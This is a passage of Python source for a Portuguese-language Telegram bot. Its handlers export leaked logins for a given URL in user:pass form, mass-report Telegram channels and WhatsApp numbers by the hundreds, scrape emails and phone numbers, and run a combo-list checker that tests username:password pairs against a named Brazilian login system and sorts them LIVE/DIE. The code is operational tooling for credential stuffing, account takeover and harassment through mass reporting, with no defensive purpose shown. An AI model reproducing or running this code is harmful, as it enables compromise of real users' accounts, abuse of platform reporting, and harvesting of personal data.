        return LoginSearch(url, id_user, pasta_temp, tasks_canceladas[hash_nome], contador_callback).buscar()

    tarefa_editar = asyncio.create_task(editar_mensagem_periodicamente())
    arquivo_raw, arquivo_formatado = await asyncio.to_thread(buscar_wrapper)
    tarefa_editar.cancel()

    try:
        await tarefa_editar
    except:
        pass

    if os.path.exists(arquivo_raw):
        with open(arquivo_raw, "r", encoding="utf-8") as f:
            qtd_logins = sum(1 for _ in f)
    else:
        qtd_logins = 0

    if qtd_logins == 0:
        await msg_busca.edit("**❌ | NENHUM RESULTADO FOI ENCONTRADO PARA A URL FORNECIDA!**\n\n🤖 @CatalystServerRobot")
        shutil.rmtree(pasta_temp, ignore_errors=True)
        usuarios_bloqueados.discard(id_user)
        return

    await msg_busca.edit(
        f"✅ **BUSCA CONCLUÍDA!**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 **URL:** `{urls_busca.get(id_user, 'N/A')}`\n"
        f"📊 **LOGINS ENCONTRADOS:** `{qtd_logins}`\n"
        "⚡ **STATUS:** `Concluído`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📥 **ESCOLHA O FORMATO:**\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("📝 USER:PASS", data=f"format1:{id_user}"),
             Button.inline("📋 FORMATADO", data=f"format2:{id_user}")],
            [Button.inline("🚫 CANCELAR", data=f"cancel:{id_user}")]
        ]
    )

    usuarios_bloqueados.discard(id_user)

@bot.on(events.NewMessage(pattern=r'^/report$'))
async def report_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    global report_data

    if report_data["running"] or whatsapp_report_data["running"]:
        await event.reply("**⛔ | JÁ EXISTE UM PROCESSO DE REPORT EM ANDAMENTO!**\n\nUse `/reset` para parar o processo atual.")
        return

    report_data["user_id"] = event.sender_id
    await event.reply(
        "📝 **CONFIGURAR REPORT TELEGRAM**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "**PASSO 1/3:** Digite o texto da denúncia\n\n"
        "💡 **Exemplo:**\n"
        "`Este canal está enviando spam`\n"
        "`Conteúdo inadequado sendo compartilhado`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.on(events.NewMessage(pattern=r'^/reportwpp$'))
async def reportwpp_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    global whatsapp_report_data

    if whatsapp_report_data["running"] or report_data["running"]:
        await event.reply("**⛔ | JÁ EXISTE UM PROCESSO DE REPORT EM ANDAMENTO!**\n\nUse `/reset` para parar o processo atual.")
        return

    whatsapp_report_data["user_id"] = event.sender_id
    await event.reply(
        "📱 **CONFIGURAR REPORT WHATSAPP**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "**PASSO 1/2:** Digite o número do WhatsApp\n\n"
        "📋 **Formatos aceitos:**\n"
        "• `+5511999999999`\n"
        "• `11999999999`\n"
        "• `5511999999999`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.on(events.NewMessage(pattern=r'^/webscraper (.+)'))
async def webscraper_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    url = event.pattern_match.group(1).strip()
    user_id = event.sender_id

    # Validar URL
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    await event.reply(
        f"🕷️ **WEB SCRAPER v3.0**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 **URL:** `{url}`\n\n"
        "📊 **ESCOLHA O QUE EXTRAIR:**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("📧 Emails", data=f"scrape_emails:{user_id}:{url}"),
             Button.inline("📞 Telefones", data=f"scrape_phones:{user_id}:{url}")],
            [Button.inline("🔗 Links", data=f"scrape_links:{user_id}:{url}"),
             Button.inline("📋 Tudo", data=f"scrape_all:{user_id}:{url}")],
            [Button.inline("🗑️ Cancelar", data=f"apagarmensagem:{user_id}")]
        ]
    )
async def execute_report2_advanced(user_id):
    """Executa reports avançados - FUNCIONALIDADE INDISPONÍVEL PARA BOTS"""

    if f'report2_data_{user_id}' not in globals():
        return

    data = globals()[f'report2_data_{user_id}']

    # Explicar limitação técnica
    await bot.send_message(
        user_id,
        f"❌ **REPORT2 INDISPONÍVEL**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ **Limitação Técnica:**\n"
        "O sistema de reports avançados (Report2) não funciona com bots do Telegram.\n\n"
        "🔧 **Motivo:**\n"
        "A API `ReportPeerRequest` é restrita apenas para contas de usuário, não para bots.\n\n"
        "💡 **Alternativas disponíveis:**\n"
        "• Use `/report` para reports básicos\n"
        "• Use `/reportwpp` para reports WhatsApp\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot"
    )

    # Limpar dados
    if f'report2_data_{user_id}' in globals():
        globals()[f'report2_data_{user_id}']['running'] = False

async def safe_edit_message(event, message, buttons=None):
    """Edits a message safely, handling the MessageNotModifiedError."""
    try:
        if buttons:
            await event.edit(message, buttons=buttons)
        else:
            await event.edit(message)
    except Exception as e:
        if "not modified" not in str(e).lower():
            print(f"⚠️ Erro ao editar mensagem: {e}")
        # Se a mensagem não foi modificada, simplesmente ignore o erro
        pass

@bot.on(events.NewMessage(pattern=r'^/report2$'))
async def report2_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    user_id = event.sender_id

    await event.reply(
        "❌ **REPORT2 INDISPONÍVEL**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ **Limitação Técnica:**\n"
        "O sistema de reports avançados (Report2) não funciona com bots do Telegram.\n\n"
        "🔧 **Motivo:**\n"
        "A API `ReportPeerRequest` é restrita apenas para contas de usuário, não para bots.\n\n"
        "💡 **Alternativas disponíveis:**\n"
        "• `/report` - Reports básicos do Telegram\n"
        "• `/reportwpp` - Reports WhatsApp\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("📝 Usar /report", data=f"cmd_report:{user_id}"),
             Button.inline("📱 Usar /reportwpp", data=f"cmd_reportwpp:{user_id}")],
            [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{user_id}")]
        ]
    )
@bot.on(events.NewMessage)
async def message_handler(event):
    global report_data, whatsapp_report_data

    # Verificar comando errado ANTES de processar outras coisas
    if event.raw_text.startswith('/'):
        if await verificar_comando_errado(event):
            return  # Se foi um comando errado corrigido, parar aqui
        else:
            return  # Se foi um comando válido, deixar outros handlers processarem

    # Ignorar mensagens vazias ou que não são texto
    if not event.raw_text:
        return

    user_id = event.sender_id

    # Verificar autorização para handlers de mensagem (reports em andamento)
    if not eh_autorizado(user_id):
        return

    # Processo de report Telegram - step by step
    if report_data["user_id"] == user_id and not report_data["running"]:
        if not report_data["text"]:
            report_data["text"] = event.raw_text
            await event.reply("**🔗 | AGORA ENVIE O LINK QUE DESEJA REPORTAR:**\n(Formato: 'https://t.me/exemplo' ou 't.me/exemplo')")
        elif not report_data["link"]:
            link = event.raw_text.strip()
            if link.startswith("t.me/"):
                link = "https://" + link
            elif not link.startswith("https://t.me"):
                await event.reply("**❌ | O LINK DEVE COMEÇAR COM 'https://t.me' OU 't.me/'**")
                return

            report_data["link"] = link
            await event.reply("**🔢 | QUANTOS REPORTS VOCÊ DESEJA ENVIAR?**\n(Digite um número entre 1 e 1000):")
        elif not report_data["quantity"]:
            try:
                quantity = int(event.raw_text)
                if quantity < 1 or quantity > 1000:
                    await event.reply("**❌ | A QUANTIDADE DEVE SER ENTRE 1 E 1000**")
                    return

                report_data["quantity"] = quantity
                report_data["counter"] = 0
                report_data["running"] = True
                report_data["start_time"] = datetime.now()

                await event.reply(
                    f"**🚀 | INICIANDO ENVIO DE {quantity} REPORTS...**\n"
                    f"📝 Texto: {report_data['text']}\n"
                    f"🔗 Link: {report_data['link']}\n\n"
                    "Você receberá atualizações em breve.",
                    buttons=[[Button.inline("⏹ | PARAR REPORTS", data=f"stop_reports:{user_id}")]]
                )

                # Iniciar processo de envio
                asyncio.create_task(send_reports_async(user_id))

            except ValueError:
                await event.reply("**❌ | POR FAVOR, DIGITE UM NÚMERO VÁLIDO ENTRE 1 E 1000**")



    # Processo de Sites Checker - aguardando URL
    elif f'sites_state_{user_id}' in globals() and globals()[f'sites_state_{user_id}'].get('waiting_url'):
        url = event.raw_text.strip()

        # Validar e corrigir URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        # Verificar o site
        status_info = check_site_status(url)

        response_text = f"🌐 **RESULTADO - VERIFICAÇÃO DE SITE**\n\n"
        response_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        response_text += f"🔗 **URL:** `{url}`\n"
        response_text += f"📊 **Status:** {status_info['status']}\n"

        if status_info['response_time']:
            response_text += f"⚡ **Tempo de Resposta:** {status_info['response_time']}ms\n"

        response_text += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        response_text += "🤖 @CatalystServerRobot"

        await event.reply(
            response_text,
            buttons=[
                [Button.inline("🔍 Verificar Outro", data=f"check_custom:{user_id}")],
                [Button.inline("🔙 Voltar", data=f"sites_checker:{user_id}")]
            ]
        )

        # Limpar estado
        globals()[f'sites_state_{user_id}']['waiting_url'] = False

    # Processo de report WhatsApp - step by step
    elif whatsapp_report_data["user_id"] == user_id and not whatsapp_report_data["running"]:
        if not whatsapp_report_data["phone"]:
            phone = event.raw_text.strip()
            # Validar formato do telefone
            phone_clean = re.sub(r'[^\d+]', '', phone)
            if not re.match(r'^(\+55)?[1-9][1-9]\d{8,9}$', phone_clean):
                await event.reply("**❌ | FORMATO INVÁLIDO!**\n\nUse: `+5511999999999` ou `11999999999`")
                return

            whatsapp_report_data["phone"] = phone_clean
            await event.reply("**🔢 | QUANTOS REPORTS VOCÊ DESEJA ENVIAR?**\n(Digite um número entre 1 e 500):")
        elif not whatsapp_report_data["quantity"]:
            try:
                quantity = int(event.raw_text)
                if quantity < 1 or quantity > 500:
                    await event.reply("**❌ | A QUANTIDADE DEVE SER ENTRE 1 E 500**")
                    return

                whatsapp_report_data["quantity"] = quantity
                whatsapp_report_data["counter"] = 0
                whatsapp_report_data["running"] = True
                whatsapp_report_data["start_time"] = datetime.now()

                await event.reply(
                    f"**📱 | INICIANDO REPORTS WHATSAPP...**\n"
                    f"📞 Número: {whatsapp_report_data['phone']}\n"
                    f"🔢 Quantidade: {quantity}\n\n"
                    "Você receberá atualizações em breve.",
                    buttons=[[Button.inline("⏹ | PARAR REPORTS", data=f"stop_whatsapp_reports:{user_id}")]]
                )

                # Iniciar processo de envio
                asyncio.create_task(send_whatsapp_reports_async(user_id))

            except ValueError:
                await event.reply("**❌ | POR FAVOR, DIGITE UM NÚMERO VÁLIDO ENTRE 1 E 500**")

    # Processo de Report2 avançado - step by step
    elif f'report2_data_{user_id}' in globals() and not globals()[f'report2_data_{user_id}'].get('running', False):
        data = globals()[f'report2_data_{user_id}']

        if data.get('step') == 2:  # Aguardando alvo
            target = event.raw_text.strip()

            if data.get('target_type') == 'post':
                # Validar link do post
                if not target.startswith("https://t.me/"):
                    await event.reply("**❌ | FORMATO INVÁLIDO!**\n\nUse: `https://t.me/canal/12345`")
                    return

                try:
                    parts = target.replace("https://t.me/", "").split("/")
                    if len(parts) != 2 or not parts[1].isdigit():
                        await event.reply("**❌ | LINK INVÁLIDO!**\n\nFormato: `https://t.me/canal/12345`")
                        return

                    data['target'] = target
                    data['channel_username'] = parts[0]
                    data['message_id'] = int(parts[1])

                except Exception:
                    await event.reply("**❌ | ERRO AO PROCESSAR LINK!**")
                    return
            else:
                # Validar username/ID
                if not target.startswith("@") and not target.lstrip('-').isdigit():
                    target = "@" + target

                data['target'] = target

            data['step'] = 3

            # Mapear razões baseado no script original
            report_reasons_map = {
                'spam': [
                    (8, "Scam or spam"),
                    (1, "I don't like it"),
                    (10, "Other")
                ],
                'scam': [
                    (8, "Scam or spam"),
                    (4, "Illegal goods"),
                    (10, "Other")
                ],
                'hate': [
                    (3, "Violence"),
                    (7, "Terrorism"),
                    (10, "Other")
                ],
                'adult': [
                    (5, "Illegal adult content"),
                    (10, "Other")
                ],
                'child': [
                    (2, "Child abuse"),
                    (10, "Other")
                ],
                'drugs': [
                    (4, "Illegal goods"),
                    (10, "Other")
                ],
                'personal': [
                    (6, "Personal data"),
                    (10, "Other")
                ],
                'copyright': [
                    (9, "Copyright"),
                    (10, "Other")
                ]
            }

            reasons = report_reasons_map.get(data.get('type', 'spam'), [(10, "Other")])

            buttons = []
            for reason_id, reason_text in reasons:
                buttons.append([Button.inline(f"⚠️ {reason_text}", data=f"report2_reason_{reason_id}:{user_id}")])

            buttons.append([Button.inline("🔙 Voltar", data=f"report2_menu:{user_id}")])

            await event.reply(
                f"⚠️ **REPORT2 - MOTIVO DA DENÚNCIA**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎯 **Alvo:** `{data['target']}`\n\n"
                "**PASSO 3/4:** Escolha o motivo específico:\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=buttons
            )

        elif data.get('step') == 4:  # Aguardando quantidade
            try:
                quantity = int(event.raw_text.strip())
                if quantity < 1 or quantity > 100:
                    await event.reply("**❌ | QUANTIDADE DEVE SER ENTRE 1 E 100**")
                    return

                data['quantity'] = quantity
                data['running'] = True
                data['counter'] = 0
                data['start_time'] = datetime.now()

                await event.reply(
                    f"🚀 **INICIANDO REPORT2 AVANÇADO...**\n\n"
                    f"🎯 **Alvo:** `{data['target']}`\n"
                    f"⚠️ **Motivo:** `{data.get('reason_text', 'N/A')}`\n"
                    f"🔢 **Quantidade:** `{quantity}`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⏳ Processando reports avançados...",
                    buttons=[[Button.inline("⏹ Parar", data=f"stop_report2:{user_id}")]]
                )

                # Iniciar processo de reports
                asyncio.create_task(execute_report2_advanced(user_id))

            except ValueError:
                await event.reply("**❌ | DIGITE UM NÚMERO VÁLIDO ENTRE 1 E 100**")

    # Validadores aguardando entrada
    elif f'validar_cpf_state_{user_id}' in globals() and globals()[f'validar_cpf_state_{user_id}'].get('waiting'):
        cpf_input = event.raw_text.strip()

        try:
            # Validar CPF
            is_valid = DataGenerator.validar_cpf(cpf_input)

            status = "✅ VÁLIDO" if is_valid else "❌ INVÁLIDO"

            await event.reply(
                f"🆔 **RESULTADO - VALIDAÇÃO CPF**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 **CPF digitado:** `{cpf_input}`\n"
                f"✅ **Status:** {status}\n\n"
                "🔍 **Verificações realizadas:**\n"
                "• Formato e tamanho\n"
                "• Dígitos verificadores\n"
                "• Algoritmo da Receita Federal\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[[Button.inline("🆔 Validar Outro CPF", data=f"validar_cpf:{user_id}")]]
            )
        except Exception as e:
            await event.reply(f"❌ **Erro na validação:** {str(e)}")

        # Limpar estado
        globals()[f'validar_cpf_state_{user_id}']['waiting'] = False

    elif f'validar_cnpj_state_{user_id}' in globals() and globals()[f'validar_cnpj_state_{user_id}'].get('waiting'):
        cnpj_input = event.raw_text.strip()

        try:
            # Validar CNPJ
            is_valid = DataGenerator.validar_cnpj(cnpj_input)

            status = "✅ VÁLIDO" if is_valid else "❌ INVÁLIDO"

            await event.reply(
                f"🏢 **RESULTADO - VALIDAÇÃO CNPJ**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 **CNPJ digitado:** `{cnpj_input}`\n"
                f"✅ **Status:** {status}\n\n"
                "🔍 **Verificações realizadas:**\n"
                "• Formato e tamanho\n"
                "• Dígitos verificadores\n"
                "• Algoritmo da Receita Federal\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[[Button.inline("🏢 Validar Outro CNPJ", data=f"validar_cnpj:{user_id}")]]
            )
        except Exception as e:
            await event.reply(f"❌ **Erro na validação:** {str(e)}")

        # Limpar estado
        globals()[f'validar_cnpj_state_{user_id}']['waiting'] = False

    elif f'validar_cartao_state_{user_id}' in globals() and globals()[f'validar_cartao_state_{user_id}'].get('waiting'):
        cartao_input = event.raw_text.strip()

        try:
            # Validar cartão
            is_valid = DataGenerator.validar_cartao(cartao_input)

            status = "✅ VÁLIDO" if is_valid else "❌ INVÁLIDO"

            await event.reply(
                f"💳 **RESULTADO - VALIDAÇÃO CARTÃO**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 **Cartão digitado:** `{cartao_input}`\n"
                f"✅ **Status:** {status}\n\n"
                "🔍 **Verificação:**\n"
                "• Algoritmo de Luhn\n"
                "• Dígito verificador\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[[Button.inline("💳 Validar Outro Cartão", data=f"validar_cartao_input:{user_id}")]]
            )
        except Exception as e:
            await event.reply(f"❌ **Erro na validação:** {str(e)}")

        # Limpar estado
        globals()[f'validar_cartao_state_{user_id}']['waiting'] = False

    # Processo de teste de integração externa
    elif f'test_integration_state_{user_id}' in globals():
        state = globals()[f'test_integration_state_{user_id}']
        
        if state.get('waiting_site_url'):
            site_url = event.raw_text.strip()
            
            # Validar URL
            if not site_url.startswith(('http://', 'https://')):
                site_url = 'https://' + site_url
            
            state['site_url'] = site_url
            state['waiting_site_url'] = False
            state['waiting_combos'] = True
            
            await event.reply(
                f"✅ **SITE CONFIGURADO PARA TESTE!**\n\n"
                f"🌐 **URL:** `{site_url}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🧪 **TESTE - PASSO 2/2**\n\n"
                "📝 **Agora cole alguns combos de teste:**\n\n"
                "💡 **Exemplo:**\n"
                "```\n"
                "teste1:senha123\n"
                "user123:pass456\n"
                "email@test.com:123456\n"
                "```\n\n"
                "🎯 **O bot irá testar:**\n"
                "• Análise do formulário do site\n"
                "• Envio automático dos combos\n"
                "• Extração dos resultados\n"
                "• Separação LIVE/DIE\n\n"
                "⌨️ Cole os combos de teste no chat:"
            )
            
        elif state.get('waiting_combos'):
            combo_text = event.raw_text.strip()
            site_url = state.get('site_url')
            
            if not ConsultCenterChecker:
                await event.reply("❌ **Erro:** Checker não disponível.")
                del globals()[f'test_integration_state_{user_id}']
                return
            
            try:
                checker = ConsultCenterChecker()
                
                # Validar combos
                accounts = checker.parse_combo_list(combo_text)
                if not accounts:
                    await event.reply("❌ **Combos inválidos!** Use o formato: `usuario:senha`")
                    return
                
                # Iniciar teste
                test_msg = await event.reply(
                    f"🧪 **TESTE DE INTEGRAÇÃO EM ANDAMENTO**\n\n"
                    f"🌐 **Site:** `{site_url}`\n"
                    f"📊 **Combos de teste:** `{len(accounts)}`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⏳ **Etapas do teste:**\n"
                    "1. 🔍 Acessando o site...\n"
                    "2. 🔧 Analisando formulários...\n"
                    "3. 📤 Enviando combos...\n"
                    "4. 📥 Processando resposta...\n"
                    "5. ✅ Extraindo resultados...\n\n"
                    "⚡ Aguarde o resultado completo..."
                )
                
                # Executar teste de integração
                result = await asyncio.to_thread(checker.check_via_external_site, combo_text, site_url)
                
                if isinstance(result, dict) and 'error' in result:
                    await test_msg.edit(
                        f"❌ **TESTE FALHOU**\n\n"
                        f"🌐 **Site testado:** `{site_url}`\n"
                        f"⚠️ **Erro:** {result['error']}\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "🔧 **Diagnóstico possível:**\n"
                        "• Site não possui checker de ConsultCenter\n"
                        "• Formulário em formato não suportado\n"
                        "• Site bloqueou a requisição\n"
                        "• URL incorreta ou inválida\n\n"
                        "💡 **Soluções:**\n"
                        "• Verifique se a URL está correta\n"
                        "• Confirme se o site tem checker ativo\n"
                        "• Tente acessar manualmente primeiro\n\n"
                        "🤖 @CatalystServerRobot"
                    )
                else:
                    results, stats = result
                    
                    # Mostrar resultado do teste
                    test_result = f"✅ **TESTE DE INTEGRAÇÃO CONCLUÍDO!**\n\n"
                    test_result += f"🌐 **Site:** `{site_url}`\n"
                    test_result += f"📊 **Estatísticas:**\n"
                    test_result += f"• **Total testado:** `{stats['total']}`\n"
                    test_result += f"• **✅ LIVE:** `{stats['live']}`\n"
                    test_result += f"• **❌ DIE:** `{stats['die']}`\n"
                    test_result += f"• **⚠️ ERRORS:** `{stats['error']}`\n\n"
                    
                    if results['live']:
                        test_result += f"🎯 **CONTAS LIVE ({len(results['live'])}):**\n"
                        for live in results['live'][:3]:  # Mostrar apenas 3
                            test_result += f"✅ `{live}`\n"
                        if len(results['live']) > 3:
                            test_result += f"• ... e mais {len(results['live']) - 3}\n"
                        test_result += "\n"
                    
                    test_result += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    test_result += "🎉 **INTEGRAÇÃO FUNCIONANDO!**\n\n"
                    test_result += "💡 **Agora você pode:**\n"
                    test_result += "• Usar esta URL no checker normal\n"
                    test_result += "• Enviar listas maiores de combos\n"
                    test_result += "• Automatizar completamente o processo\n\n"
                    test_result += "🤖 @CatalystServerRobot"
                    
                    await test_msg.edit(test_result)
                
                # Limpar estado
                del globals()[f'test_integration_state_{user_id}']
                
            except Exception as e:
                await event.reply(f"❌ **Erro no teste:** {str(e)}")
                del globals()[f'test_integration_state_{user_id}']

    # Processo de ConsultCenter checker - aguardando URL do site externo
    elif f'consultcenter_state_{user_id}' in globals() and globals()[f'consultcenter_state_{user_id}'].get('waiting_site_url'):
        site_url = event.raw_text.strip()

        # Validar URL
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url

        # Armazenar URL e aguardar combos
        globals()[f'consultcenter_state_{user_id}']['site_url'] = site_url
        globals()[f'consultcenter_state_{user_id}']['waiting_site_url'] = False
        globals()[f'consultcenter_state_{user_id}']['waiting_combos'] = True

        await event.reply(
            f"✅ **SITE CONFIGURADO!**\n\n"
            f"🌐 **URL:** `{site_url}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Agora cole sua lista de combos:**\n\n"
            "💡 **Formato aceito:**\n"
            "```\n"
            "usuario1:senha1\n"
            "usuario2:senha2\n"
            "email@exemplo.com:senha123\n"
            "```\n\n"
            "⌨️ Cole os combos no chat:"
        )

    # Processo de ConsultCenter checker - aguardando combos
    elif f'consultcenter_state_{user_id}' in globals() and globals()[f'consultcenter_state_{user_id}'].get('waiting_combos'):
        combo_text = event.raw_text.strip()
        state = globals()[f'consultcenter_state_{user_id}']
        method = state.get('method', 'local')

        if not ConsultCenterChecker:
            await event.reply("❌ **Erro:** Checker não disponível. Verifique a instalação.")
            globals()[f'consultcenter_state_{user_id}']['waiting_combos'] = False
            return

        try:
            checker = ConsultCenterChecker()

            if method == 'external':
                # Usar site externo
                site_url = state.get('site_url')
                if not site_url:
                    await event.reply("❌ **Erro:** URL do site não configurada.")
                    return

                # Validar combos
                accounts = checker.parse_combo_list(combo_text)
                if not accounts:
                    await event.reply("❌ **Nenhum combo válido encontrado!** Verifique o formato: `usuario:senha`")
                    return

                # Iniciar verificação externa
                processing_msg = await event.reply(
                    f"🌐 **CONSULTCENTER CHECKER - SITE EXTERNO**\n\n"
                    f"🌐 **Site:** `{site_url}`\n"
                    f"📊 **Total de combos:** `{len(accounts)}`\n"
                    f"🔄 **Status:** Enviando para site externo...\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⏳ Aguarde o resultado..."
                )

                # Executar checker externo
                result = await asyncio.to_thread(checker.check_via_external_site, combo_text, site_url)

                if isinstance(result, dict) and 'error' in result:
                    await processing_msg.edit(
                        f"❌ **ERRO NO CHECKER EXTERNO**\n\n"
                        f"⚠️ **Erro:** {result['error']}\n\n"
                        "💡 **Possíveis soluções:**\n"
                        "• Verifique se a URL está correta\n"
                        "• Confirme se o site tem checker de ConsultCenter\n"
                        "• Tente usar o método local\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "🤖 @CatalystServerRobot"
                    )
                    globals()[f'consultcenter_state_{user_id}']['waiting_combos'] = False
                    return

                results, stats = result

            else:
                # Usar método local
                accounts = checker.parse_combo_list(combo_text)

                if not accounts:
                    await event.reply("❌ **Nenhum combo válido encontrado!** Verifique o formato: `usuario:senha`")
                    return

                # Iniciar verificação local
                processing_msg = await event.reply(
                    f"🏥 **CONSULTCENTER CHECKER - LOCAL**\n\n"
                    f"📊 **Total de combos:** `{len(accounts)}`\n"
                    f"⚡ **Threads:** `15`\n"
                    f"🔄 **Status:** Processando localmente...\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⏳ Aguarde o resultado..."
                )

                # Executar checker local
                results, stats = await asyncio.to_thread(checker.check_list, accounts)

            # Formatar resultados
            result_message = f"🏥 **CONSULTCENTER CHECKER - RESULTADO**\n\n"
            result_message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            result_message += f"📊 **ESTATÍSTICAS:**\n"
            result_message += f"• **Total testado:** `{stats['total']}`\n"
            result_message += f"• **✅ LIVE (Aprovados):** `{stats['live']}`\n"
            result_message += f"• **❌ DIE (Reprovados):** `{stats['die']}`\n"
            result_message += f"• **⚠️ ERROR:** `{stats['error']}`\n\n"

            if results['live']:
                result_message += f"🎯 **CONTAS APROVADAS ({len(results['live'])}):**\n"
                for live in results['live'][:5]:  # Mostrar apenas as primeiras 5
                    result_message += f"✅ `{live}`\n"
                if len(results['live']) > 5:
                    result_message += f"• ... e mais {len(results['live']) - 5} contas aprovadas\n"
                result_message += "\n"

            if results['die'] and len(results['die']) <= 5:
                result_message += f"❌ **CONTAS REPROVADAS ({len(results['die'])}):**\n"
                for die in results['die'][:5]:
                    result_message += f"❌ `{die}`\n"
                result_message += "\n"

            result_message += f"📄 **Arquivo completo será enviado abaixo**\n\n"
            result_message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            result_message += "🤖 @CatalystServerRobot"

            # Criar arquivo com resultados completos se houver muitas contas
            if len(results['live']) > 10 or len(results['die']) > 50:
                filename = f"temp/consultcenter_result_{user_id}.txt"
                os.makedirs("temp", exist_ok=True)
                
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("=== CONSULTCENTER CHECKER RESULTS ===\n")
                    f.write(f"Site: sistema.consultcenter.com.br\n")
                    f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                    f.write(f"Total testado: {stats['total']}\n")
                    f.write(f"Aprovados: {stats['live']} | Reprovados: {stats['die']} | Erros: {stats['error']}\n\n")
                    
                    f.write("=" * 50 + "\n")
                    f.write(f"CONTAS APROVADAS - LIVE ({len(results['live'])})\n")
                    f.write("=" * 50 + "\n")
                    for live in results['live']:
                        f.write(f"{live}\n")
                    
                    f.write("\n" + "=" * 50 + "\n")
                    f.write(f"CONTAS REPROVADAS - DIE ({len(results['die'])})\n")
                    f.write("=" * 50 + "\n")
                    for die in results['die']:
                        f.write(f"{die}\n")
                    
                    if results['error']:
                        f.write("\n" + "=" * 50 + "\n")
                        f.write(f"ERROS DE CONEXÃO ({len(results['error'])})\n")
                        f.write("=" * 50 + "\n")
                        for error in results['error']:
                            f.write(f"{error}\n")

                await processing_msg.edit(result_message)
                await bot.send_file(
                    event.chat_id, 
                    file=filename,
                    caption=f"📄 **Resultado completo do ConsultCenter Checker**\n\n🤖 @CatalystServerRobot",
                    buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
                )

                # Limpar arquivo temporário
                try:
                    os.remove(filename)
                except:
                    pass
            else:
                await processing_msg.edit(result_message, 
                    buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
                )

        except Exception as e:
            await event.reply(f"❌ **Erro durante verificação:** {str(e)}")

        # Limpar estado
        globals()[f'consultcenter_state_{user_id}']['waiting_combos'] = False

    # Sistema de correção de comandos - deve estar no final
    elif await verificar_comando_errado(event):
        return  # Comando foi corrigido, não processar mais nada

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not event.data:
        return

    try:
        data_str = event.data.decode()
        print(f"🔧 Callback recebido: {data_str}")

        if ':' in data_str:
            parts = data_str.split(":", 2)  # Mudança aqui para permitir mais de 2 partes
            acao = parts[0]

            # Para botões do webscraper que têm 3 partes (acao:user_id:url)
            if acao.startswith("scrape_") and len(parts) >= 3:
                id_user_btn = int(parts[1])
                url = parts[2] if len(parts) > 2 else ""
            else:
                # Para outros botões que têm 2 partes (acao:user_id)
                id_user_btn = int(parts[1])
        else:
            return
    except Exception as e:
        print(f"❌ Erro ao processar callback: {e}")
        return

    if event.sender_id != id_user_btn:
